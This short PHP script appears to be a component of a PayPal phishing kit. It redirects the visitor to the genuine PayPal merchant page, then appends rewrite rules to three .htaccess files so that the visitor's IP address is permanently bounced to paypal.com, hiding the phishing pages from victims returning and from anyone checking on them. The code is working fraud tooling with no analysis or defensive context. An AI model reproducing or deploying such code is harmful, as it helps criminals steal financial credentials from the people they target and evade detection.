<?php

include('../../detect.php');

header("LOCATION: https://www.paypal.com/".$kode_negara."/webapps/mpp/merchant");

$file = fopen("../.htaccess","a");
fwrite($file, 'RewriteCond %{REMOTE_ADDR} ^'.$_SERVER['REMOTE_ADDR'].'$
RewriteRule .* https://www.paypal.com [R,L]
');
fclose($file);

$file1 = fopen(".htaccess","a");
fwrite($file1, 'RewriteCond %{REMOTE_ADDR} ^'.$_SERVER['REMOTE_ADDR'].'$
RewriteRule .* https://www.paypal.com [R,L]
');
fclose($file1);

$file2 = fopen("../../webapps/.htaccess","a");
fwrite($file2, 'RewriteCond %{REMOTE_ADDR} ^'.$_SERVER['REMOTE_ADDR'].'$
RewriteRule .* https://www.paypal.com [R,L]
');
fclose($file2);

exit;

?>